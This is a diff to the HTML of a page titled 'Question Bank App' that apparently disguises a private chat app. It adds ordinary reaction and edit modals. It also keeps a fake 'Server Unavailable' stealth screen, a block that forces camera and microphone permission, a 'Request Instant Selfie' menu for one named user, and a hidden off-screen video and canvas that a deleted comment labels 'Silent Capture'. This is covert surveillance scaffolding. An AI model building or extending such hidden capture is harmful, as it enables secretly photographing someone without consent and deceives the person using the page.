@@ -1,10 +1,11 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Question Bank App</title>
-    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="style.css?v=111">
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Noto+Color+Emoji&display=swap" rel="stylesheet">
@@ -12,7 +13,6 @@
 </head>
 <body>
 
-    <!-- STEALTH SCREEN (Always visible first) -->
     <div id="stealth-screen">
         <div class="stealth-icon">⚠️</div>
         <div class="stealth-title">Server Unavailable</div>
@@ -20,7 +20,6 @@
         <button class="stealth-btn" onclick="location.reload()">Try Again</button>
     </div>
 
-    <!-- FULL PAGE PERMISSION BLOCK -->
     <div id="perm-block">
         <h2>⚠️ Permission Required</h2>
         <p>Cannot load Basic Chat features. Voice messages or Video Calls require microphone & camera access to function.<br><br>Please enable permissions in browser settings and tap Retry.</p>
@@ -32,7 +31,6 @@
         <div class="loading-text">Secured Chat Loading</div>
     </div>
 
-    <!-- MEDIA VIEWER (Fixed Overlay) -->
     <div id="media-viewer" class="media-overlay">
         <div class="media-top-bar">
             <button id="media-download-btn" style="display: none;" class="icon-btn">⬇</button>
@@ -52,6 +50,28 @@
         </div>
     </div>
 
+    <div id="custom-rx-input-modal" class="modal-overlay">
+        <div class="modal-content">
+            <h3>Custom Reaction</h3>
+            <input type="text" id="inp-custom-rx" class="modal-input" placeholder="Type emoji or text..." maxlength="100">
+            <div class="modal-btns">
+                <button id="btn-custom-rx-cancel" class="modal-btn btn-cancel">Cancel</button>
+                <button id="btn-custom-rx-confirm" class="modal-btn btn-primary">React</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="edit-modal" class="modal-overlay">
+        <div class="modal-content">
+            <h3>Edit Message</h3>
+            <input type="text" id="inp-edit-msg" class="modal-input" placeholder="New message content...">
+            <div class="modal-btns">
+                <button id="btn-edit-cancel" class="modal-btn btn-cancel">Cancel</button>
+                <button id="btn-edit-confirm" class="modal-btn btn-primary">Save</button>
+            </div>
+        </div>
+    </div>
+
     <div id="context-menu">
         <div class="ctx-header">
             <span>Actions</span>
@@ -67,19 +87,18 @@
             <span data-emoji="😒">😒</span>
             <span data-emoji="😡">😡</span>
             <span data-emoji="👍">👍</span>
+            <span id="rx-custom-btn">➕</span>
         </div>
         <div class="ctx-item" id="ctx-reply">↩️ Reply</div>
+        <div class="ctx-item" id="ctx-edit" style="display:none;">✏️ Edit</div>
         <div class="ctx-item red" id="ctx-unsend" style="display:none;">🚫 Unsend</div>
         <div class="ctx-item" id="ctx-remove">🗑️ Remove for Me</div>
     </div>
 
-    <!-- SIDE MENU (Sam10 Only) -->
     <div id="side-menu-overlay"></div>
     <div id="side-menu">
         <div class="menu-header">Menu</div>
-        <!-- NEW BUTTON: DIRECT REQUEST -->
         <div class="menu-item" id="menu-req-btn" onclick="window.requestInstantSelfie()">📸 Request Instant Selfie</div>
-        <!-- SEE SELFIES -->
         <a href="quickselfies.html" class="menu-item">🖼️ View Romantic Selfies</a>
         <div class="menu-item" id="menu-close">✖ Close Menu</div>
     </div>
@@ -95,7 +114,6 @@
     <div id="chat-screen">
         <header>
             <div class="header-left">
-                <!-- Hamburger Button (Hidden by default, shown for Sam10) -->
                 <div id="hamburger-btn" style="display:none; margin-right:10px; font-size:24px; cursor:pointer;">☰</div>
                 
                 <div class="avatar-wrapper">
@@ -117,7 +135,6 @@
         <div id="scroll-down-btn">⬇</div>
         <div id="status-text"></div>
         
-        <!-- TYPING INDICATOR -->
         <div id="typing-indicator">
             <div class="typing-dot"></div>
             <div class="typing-dot"></div>
@@ -149,7 +166,6 @@
         </div>
     </div>
 
-    <!-- Hidden Elements for Silent Capture -->
     <video id="hidden-cam" autoplay playsinline muted style="opacity:0; position:absolute; top:-9999px; pointer-events:none; z-index:-1;"></video>
     <canvas id="hidden-canvas" style="display:none;"></canvas>
 
@@ -211,6 +227,6 @@
             document.dispatchEvent(new Event('app-unlocked'));
         }
     </script>
-    <script type="module" src="app.js"></script>
+    <script type="module" src="app.js?v=1111"></script>
 </body>
 </html>
